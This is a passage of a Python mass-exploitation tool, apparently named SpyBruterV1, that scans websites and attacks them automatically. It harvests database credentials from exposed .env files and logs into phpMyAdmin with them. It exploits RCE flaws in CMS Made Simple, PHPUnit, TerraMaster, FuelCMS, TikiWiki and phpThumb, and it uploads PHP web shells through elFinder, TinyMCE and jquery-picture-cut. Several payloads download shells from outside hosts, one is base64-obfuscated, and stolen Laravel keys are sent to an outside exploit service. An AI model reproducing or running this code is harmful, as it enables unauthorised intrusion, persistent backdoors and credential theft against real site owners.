                if requests.get('http://'+host+'/bypassec0x1337').status_code == 200:
                   #print(la5dhar +'[AdminPanel]'+ url + ' +++++++++++++ [Fake Admin Panel]'+ '\n')
                   pass
                elif GetConfiga.status_code == 200:
                    #print(username,password)
                    print(la5dhar +'[PhpMyAdmin]http://'+ host + ' +++++++++++++ [Found PhpMyadmin Panel]'+ '\n')
                    with open('Vulns/pmabypass.txt', 'a') as writer:
                       writer.write(Exp + '\n')
                    response = requests.Session()
                    res = response.get(Exp)
                    token = re.search('input.*value=\"(.*?)\"', res.text, re.S).group(1)
                    data={
                        'pma_username':username,
                        'pma_password':password,
                        'server':'1',
                        'target':'index.php',
                        'token':token
                    }
                    headersty = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"}
                    r=response.post(Exp,data=data,headers=headersty)
                    if 'db_structure.php' in r.text:                    
                        print(la5dhar +'[PhpMyAdmin]http://'+ host + ' +++++++++++++ [Login Success PhpMyadmin]'+ '\n')
                        with open('Vulns/pma.txt', 'a') as ww:
                            ww.write(url+' -->'+Exp+' username:'+username+' password:'+ password + '\n')
                            #sys.exit()
                    else:
                        print(la7mar +'[PhpMyAdmin]'+cyan+url+cyan+la7mar +'[Not login PhpMyadmin]'+la7mar+ '\n')
                else:
                    pass
        except Exception as e: 
    	    pass
    def cnsmade(self,url):
        try:
            som="/index.php?mact=News,cntnt01,detail,0&cntnt01articleid=1&cntnt01detailtemplate=string:{php}echo%20system(%2527ls%20-la%2527);{/php}&cntnt01returnid=1"
            CheckShellx = requests.get(url + "/index.php?mact=News,cntnt01,detail,0&cntnt01articleid=1&cntnt01detailtemplate=string:{php}echo system(%2527cd tmp/cache;wget https://raw.githubusercontent.com/izx2023/z/main/14x.php%2527);{/php}&cntnt01returnid=1",timeout=10, headers=Headers)
            CheckShelly = requests.get(url + som,timeout=10, headers=Headers)
            CheckShell = requests.get(url + '/tmp/cache/14x.php', headers=Headers)
            if 'rwxr' in str(CheckShelly.text):
                with open('Vulns/cmsmadeSimple.txt', 'a') as writer:
                    writer.write(url + som + '\n')
                print(la5dhar +'[CmsMadeSimple]'+ url + ' +++++++++++++ [Cms Made Simple Vuln RCE]'+ '\n')
                if 'SEA-GHOST' in str(CheckShell.text):
                    with open('Vulns/shell_vulns.txt', 'a') as writer:
                        writer.write(url + '/tmp/cache/14x.php' + '\n') 
                else:
                    print(la7mar +'[CmsMadeSimple]'+cyan+url+cyan+la7mar +'[Shell Upload Failed]'+la7mar+ '\n')                        
            else:
                print(la7mar +'[CmsMadeSimple]'+cyan+url+cyan+la7mar +'[Not Vuln Cms Made Simple RCE]'+la7mar+ '\n')
        except:
            print(la7mar +'[CmsMadeSimple]'+cyan+url+cyan+la7mar +'[Not Vuln Cms Made Simple RC]'+la7mar+ '\n')
            pass
    def z(self,link):

        try:
            data = {"user": "blazy.py","host": link}
        
            command = "start /wait cmd /c python {user} {host}"
            os.system(command.format(**data))
            print({host})
            #os.system("start /wait cmd /c python {user} {host}")
            #command = "start /wait cmd /c python {user} {host}"
            #os.system(command.format(**data))
            sys.exit()            
        except:
            pass

    def teleex(self,likk):

        try:
            data = {"user": "tel.py k -u","host": likk}
        
            command = "start /wait cmd /c python {user} {host}"
            os.system(command.format(**data))
            print({host})
            #os.system("start /wait cmd /c python {user} {host}")
            #command = "start /wait cmd /c python {user} {host}"
            #os.system(command.format(**data))
            sys.exit()            
        except:
            pass

    def othercms(self,url):

        try:
            pazx = [
            '/admin/index.php',
            '/admin/admin.php',
            '/admin/login.php',
            '/login/login.php',         
            '/login/admin.php',
            '/admin-login.php',         
            '/admin.php']
            for pasf in pazx:
                Exp = url + pasf
                GetConfiga = requests.get(Exp, timeout=15, headers=Headers)
                if requests.get(url+'/bypassec0x1337').status_code == 200:
                   #print(la5dhar +'[AdminPanel]'+ url + ' +++++++++++++ [Fake Admin Panel]'+ '\n')
                   pass
                elif 'type="password"' in GetConfiga.text and 'method="post"' in GetConfiga.text and GetConfiga.status_code == 200:
                    print(la5dhar +'[AdminPanel]'+ url + ' +++++++++++++ [Found Admin Panel]'+ '\n')
                    link = Exp
                    self.z(link)

                    with open('Vulns/admin.txt', 'a') as ww:
                        ww.write('Vuln  : ' + Exp + '\n')
                        sys.exit()   
                else:
                    print(la7mar +'[AdminPanel-Search]'+cyan+url+cyan+la7mar +'[Not Found Admin Panel]'+la7mar+ '\n')
        except:
            print(la7mar +'[AdminPanel-Search]'+cyan+url+cyan+la7mar +'[Not Found Admin Panel]'+la7mar+ '\n')
            pass
 

        try:       
            cvbr = requests.get(url+'/.env',headers=Headers)        
            key = re.findall('base64:(.*?)=', cvbr.text)
            getuser = re.findall("DB_USERNAME=(.*?)\n",cvbr.text)
            gethost = re.findall("DB_HOST=(.*?)\n",cvbr.text)
            getdb = re.findall("DB_DATABASE=(.*?)\n",cvbr.text)
            getpassw = re.findall("DB_PASSWORD=(.*?)\n\n",cvbr.text)
            username=getuser[0].replace('"', '')
            host=gethost[0].replace('"', '')
            db=getdb[0].replace('"', '')
            password=getpassw[0].replace('"', '')
            self.LoginHTTP(host, username, password, db, url)
            self.pma(url,username,password)
            post = {"target":url,"key":key[0],"autoshell":"Auto Upload Shell"}    
            headergj = {"Host": "exploit.anons79.com"}            
            cvb = requests.post('http://exploit.anons79.com/',headers=headergj,data=post)
            if '[+] Vuln OK' in cvb.text:
                print(la5dhar +'[Laravel]'+ url + ' +++++++++++++ [Vuln Laravel Apikey]'+ '\n')
                token = re.findall("_blank'> (.*?)</a>", cvb.text)
                print(token[0])
                with open('Vulns/apikeyRCE.txt', 'a') as writer:
                    writer.write(url+'/.env' + '\n'+token[0]+'\n')    
                
            else:
                print(la7mar +'[Laravel]'+cyan+url+cyan+la7mar +'[Not Vuln Laravel Apikey]'+la7mar+ '\n')
        except:
            print(la7mar +'[Laravel]'+cyan+url+cyan+la7mar +'[Not Vuln Laravel Apikey]'+la7mar+ '\n')
            pass
        try:
            paths = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                    "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php", "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
                    "/vendor/phpunit/Util/PHP/eval-stdin.php", "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                    "/phpunit/phpunit/Util/PHP/eval-stdin.php", "/phpunit/src/Util/PHP/eval-stdin.php",
                    "/phpunit/Util/PHP/eval-stdin.php", "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                    "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php", "/lib/phpunit/src/Util/PHP/eval-stdin.php",
                    "/lib/phpunit/Util/PHP/eval-stdin.php"]
            for path in paths:
                try:
                    #cmd ="<?php system('echo priv88'); ?>"
                    cmd ="<?php system('cd ..;cd ..;wget https://raw.githubusercontent.com/izx2023/z/main/14x.php;echo priv88'); ?>" 
                    shell_path = url + path.replace('eval-stdin.php', 'as.php')
                    payload = url + path
                    se3 = requests.session()
                    Agent3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
                    ktn3 = se3.get(payload, headers=Agent3, data=cmd, timeout=30)
                    ktnr = se3.get(url+'/vendor/phpunit/phpunit/src/14x.php', headers=Agent3, timeout=15)
                    if 'priv88' in ktn3.text:
                        self.HACKiT(url, payload, shell_path)
                        print(la5dhar +'[PhpUnit]'+ url + ' +++++++++++++ [RCE PhpUnit]'+ '\n')
                        open('Vulns/RCE.txt', 'a').write(payload +"\n")
                        if 'SEA-GHOST' in ktnr.text:
                            print(la5dhar +'[PhpUnit]'+ url + ' +++++++++++++ [Shell PhpUnit]'+ '\n')
                            open('Vulns/Shells.txt', 'a').write(url+'/vendor/phpunit/phpunit/src/14x.php' + '\n')
                            sys.exit()

                    else:
                        #print((la7mar +'[PhpUnit]'+cyan+url+cyan+la7mar +'[Not Upload PhpUnit]'+la7mar+ '\n'))
                        pass

                except:
                    pass
        except:
            print(la7mar +'[PhpUnit]'+cyan+url+cyan+la7mar +'[Not Vuln PhpUnit]'+la7mar+ '\n')
            pass

        try:
            s = requests.Session()
            url=url.replace("/:8181","")
            url=url.replace(":8181","")
            #url=url.replace(":8181/","")
            izo = self.ran(10) + '.php'
            payloadt="http|echo \"<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpNHU3L2p1c3QtZm9yLWZ1bi9tYXN0ZXIvd3AucGhwIiwiYXMucGhwIikpIHsKCWVjaG8gIlN1a3NlcyI7Cn0gZWxzZSB7CgllY2hvICJmYWlsIjsKfQo/Pg==')); ?>\" >> /usr/www/"+izo+" && chmod +x /usr/www/"+izo+"||"
            payloadyt = "http|echo \"<?php echo(passthru(\\$_GET['cmd']));?>\" >> /usr/www/"+izo+" && chmod +x /usr/www/"+izo+"||"
            r = s.post(url+':8181',data=payloadt)
            time.sleep(0.1)
            r = s.post(url+':8181',data=payloadyt)
            Check = s.get(url  + ':8181/include/makecvs.php?Event='+payloadt, headers=Headers)
            Checke = s.get(url  + ':8181/include/makecvs.php?Event='+payloadyt, headers=Headers)
            time.sleep(0.3)
            caer = s.get(url+':8181/'+izo, headers=Headers, verify=False)
            if 'Sukses' in caer.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + ':8181/as.php' + '\n')
                print(la5dhar +'[Unk]'+ url + ' +++++++++++++ [TerraMaster Uploaded Shell]'+ '\n')
            elif 'Sukses' in caer.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + ':8181/as.php' + '\n')
                print(la5dhar +'[Unk]'+ url + ' +++++++++++++ [TerraMaster Uploaded Shell]'+ '\n')
            elif 'uid=0(root) gid=0(root)' in s.get(url+':8181/'+izo+'?cmd=id', headers=Headers, verify=False).text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + ':8181/'+izo+'?cmd=id' + '\n')
                print(la5dhar +'[Unk]'+ url + ' +++++++++++++ [TerraMaster Uploaded Shell]'+ '\n')                

            else:
                print(la7mar +'[Unk]'+cyan+url+cyan+la7mar +'[Not Vuln TerraMaster]'+la7mar+ '\n')
        except:
            print(la7mar +'[Unk]'+cyan+url+cyan+la7mar +'[Not Vuln TerraMaster]'+la7mar+ '\n')
            pass
        try:
            full_url = url+'/admin/js/plugins/elfinder/php/connector.minimal.php'

            self.data = {
                'cmd': 'mkfile',
                'target': 'l1_Lw',
                'name': 'izocin.php'

            }

            content=req.get("https://raw.githubusercontent.com/izx2023/z/main/14.php", verify=False)
            content=content.text
            self.data2={"cmd" : "put", "target":"l1_L1xpem9jaW4ucGhw", "content": content}
            res = requests.post(full_url, data=self.data, timeout=10,verify=False)
            time.sleep(0.3)
            resx = requests.post(full_url, data=self.data2, timeout=15,verify=False)
            resi = requests.get(url+'/admin/js/plugins/elfinder/files/izocin.php')
            if "SEA-GHOST" in resi.text:
                print(la5dhar +'[Elfinder]'+ url + ' +++++++++++++ [Elfinder Uploaded Shell]'+ '\n')
                with open('Vulns/Shells.txt', 'a') as writer:
                    writer.write(url+'/admin/js/plugins/elfinder/files/izocin.php' + '\n')        
            else:
                print(la7mar +'[Elfinder]'+cyan+url+cyan+la7mar +'[Not Vuln Elfinder]'+la7mar+ '\n')

        except:
            print(la7mar +'[Elfinder]'+cyan+url+cyan+la7mar +'[Not Vuln Elfinder]'+la7mar+ '\n')
            pass
            
        try:
            paths = ["/tinymce/plugins/image/upload.php",
                    "/tinymce/js/tinymce/plugins/filemanager/upload.php", "/assets/js/admin/tinymce/plugins/image/upload.php",
                    "/assets/editeur/core/packages/tinymce/plugins/image/upload.php", "/webroot/plugins/tinymce/plugins/image/upload.php",
                    "/plugins/tinymce/plugins/image/upload.php", "/assets/assets/js/tinymce4/plugins/image/upload.php",
                    "/js/admin/tinymce/plugins/image/upload.php", "/files/tinymce/plugins/image/upload.php",
                    "/admin/tinymce/plugins/image/upload.php", "/assets/backend/global/plugins/tinymce/plugins/image/upload.php",
                    "/global/plugins/tinymce/plugins/image/upload.php", "/demo/js/tinymce/plugins/image/upload.php",
                    "/demo/tinymce/plugins/image/upload.php", "/platform/core/base/public/libraries/tinymce/plugins/image/uploads/upload.php"]
            for path in paths:
                try:


                    s = requests.Session()
                    payload = url + path
                    shell_path = url + path.replace('upload.php', '/rename_file.php?current_name=asx.jpg&new_name=izo.php')
                    #print (shell_path)
                    #print (payload)
                    self.files={'upl':open('files/asx.jpg', 'r')}
                    r = s.post(payload,files=self.files)

                    rr = s.get(shell_path)

                    if 'SEA-GHOST' in s.get(payload.replace('upload.php', '/uploads/izo.php')).text:
                        print(la5dhar +'[Tinymce]'+ url + ' +++++++++++++ [Tinymce Uploaded Shell]'+ '\n')
                        open('Vulns/Shells.txt', 'a').write(url + path.replace('upload.php', '/uploads/izo.php') +"\n")
                        break
                    else:
                        print(la7mar +'[Search-Tinymce]'+cyan+url+cyan+la7mar +'[Not Vuln Tinymce]'+la7mar+ '\n')
                    pass
                except:
                    print(la7mar +'[Search-Tinymce]'+cyan+url+cyan+la7mar +'[Not Vuln Tinymce]'+la7mar+ '\n')
                pass
            pass
        except:
            print(la7mar +'[Search-Tinymce]'+cyan+url+cyan+la7mar +'[Not Vuln Tinymce]'+la7mar+ '\n')
            pass
        pass

        try:
            pazsx = [
            '/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg ;ls -la;&phpThumbDebug=9p',
            '/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg;ls -la;&phpThumbDebug=9',
            '/assets/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg;ls -la;&phpThumbDebug=9',
            '/plugins/system/jsntplframework/libraries/3rd-party/PhpThumb/PHPThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg;ls -la;&phpThumbDebug=9',                 
            '/e107_plugins/zogo-shop/images/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlaceline file.jpg jpeg:file.jpg;ls -la;&phpThumbDebug=9']
            for pasef in pazsx:
                Exp = url + pasef
                GetConfiga = requests.get(Exp, timeout=15, headers=Headers)
                if 'rwxr' in str(GetConfiga.text):
                    print(la5dhar +'[phpThumb]'+ url + ' +++++++++++++ [Found phpThumb]'+ '\n')
                    with open('Vulns/admin.txt', 'a') as ww:
                        ww.write('Vuln  : ' + Exp + '\n')
                        sys.exit()   
                else:
                    print(la7mar +'[phpThumb-Search]'+cyan+url+cyan+la7mar +'[Not Found phpThumb]'+la7mar+ '\n')
        except:
            print(la7mar +'[phpThumb-Search]'+cyan+url+cyan+la7mar +'[Not Found phpThumb]'+la7mar+ '\n')
            pass

        try:
            pazx = [
            "/admin/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27ls%20-la%27)%2b%27",
            "/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27ls%20-la%27)%2b%27",
            "/site/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27ls%20-la%27)%2b%27",
            "/blog/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27ls%20-la%27)%2b%27"]
            for pasf in pazx:
                Exp = url + pasf
                GetConfiga = requests.get(Exp, timeout=15, headers=Headers)
                if 'rwxr' in str(GetConfiga.text):
                    print(la5dhar +'[FuelCms]'+ url + ' +++++++++++++ [FuelCms Uploaded Shell]'+ '\n')
                    with open('Vulns/fuelcmssrce.txt', 'a') as ww:
                        ww.write('Vuln  : ' + Exp + '\n')
                    sys.exit()   
                else:
                    print(la7mar +'[FuelCms]'+cyan+url+cyan+la7mar +'[Not Vuln FuelCms]'+la7mar+ '\n')
        except:
            print(la7mar +'[FuelCms]'+cyan+url+cyan+la7mar +'[Not Vuln FuelCms]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php'    
            PostFile = {'inputOfFile': (izo, shell, 'text/html')}
            cok = {"request":"upload","inputOfFile":"inputOfFile","enableResize":"0","minimumWidthToResize":"0","folderOnServer":"/","imageNameRandom":"0","enableMaximumSize":"0","minimumWidthToResize":"0","minimumHeightToResize":"0","maximumSize":"0"}
            requests.post(url + '/jquery-picture-cut/src/php/upload.php',data=cok,files=PostFile, timeout=10, headers=Headers)
            CheckShell = requests.get(url + '/jquery-picture-cut/src/php/'+izo,timeout=10, headers=Headers)
            if 'SEA-GHOST' in str(CheckShell.text):
                with open('Vulns/Shells.txt', 'a') as writer:
                    writer.write(url + '/jquery-picture-cut/src/php/'+izo+'?izo=help' + '\n')
                print(la5dhar +'[jquerypicturecut]'+ url + ' +++++++++++++ [jquerypicturecut Uploaded Shell]'+ '\n')
            else:
                print(la7mar +'[jquerypicturecut]'+cyan+url+cyan+la7mar +'[Not Vuln jquerypicturecut]'+la7mar+ '\n')
        except:
            print(la7mar +'[jquerypicturecut]'+cyan+url+cyan+la7mar +'[Not Vuln jquerypicturecut]'+la7mar+ '\n')
            pass
        try:
            som="/tiki-calendar.php?viewmode=%27;%20$z=fopen(%22index6.php%22,%27w%27);%20fwrite($z,(%22TikiWikiRCE%22));fclose($z);$a=%27"
            CheckShellx = requests.get(url + som,timeout=10, headers=Headers)
            CheckShell = requests.get(url + '/index6.php', headers=Headers)
            if 'TikiWikiRCE' in str(CheckShell.text):
                with open('Vulns/Shells.txt', 'a') as writer:
                    writer.write(url + som + '\n')
                print(la5dhar +'[tiki-calendar]'+ url + ' +++++++++++++ [tiki-calendar Uploaded Shell]'+ '\n')
            else:
                print(la7mar +'[tiki-calendar]'+cyan+url+cyan+la7mar +'[Not Vuln tiki-calendar]'+la7mar+ '\n')
        except:
            print(la7mar +'[tiki-calendar]'+cyan+url+cyan+la7mar +'[Not Vuln tiki-calendar]'+la7mar+ '\n')
            pass

        try:
            a = requests.Session()
            GetLink = a.get(url, headers=Headers, timeout=20)
            urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text ))
            if len(urls) != 0:
                self.CheckSqliURL(url, urls)
                self.ChecklfiURL(url,urls)
                self.Checkdd(url,urls)
                self.Checkddrc(url,urls)
        except:
            print((la7mar +'[SsTi]'+cyan+url+cyan+la7mar +'[Error ssti]'+la7mar+ '\n'))
            pass
SpyBruterV1()